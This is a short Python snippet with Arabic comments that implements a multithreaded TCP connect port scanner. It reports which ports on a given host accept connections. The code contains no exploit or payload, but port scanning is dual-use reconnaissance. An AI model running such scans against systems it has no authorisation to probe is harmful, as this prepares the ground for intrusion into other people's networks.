def scan_port(host, port, results, lock):
    """يفحص بورت واحد ويحفظ النتيجة"""
    try:
        s = socket.socket()
        s.settimeout(1)
        if s.connect_ex((host, port)) == 0:
            with lock:
                results.append(port)
                print(f"  [OPEN]  {host}:{port}")
        s.close()
    except:
        pass

def run_scanner(host, ports):
    """يشغل الـ scanner على كل البورتات بـ threads"""
    print(f"\n[*] Scanning {host} ...")
    results = []
    lock = threading.Lock()
    with ThreadPoolExecutor(max_workers=100) as ex:
        for p in ports:
            ex.submit(scan_port, host, p, results, lock)
    print(f"[*] Open ports: {sorted(results)}")
    return results

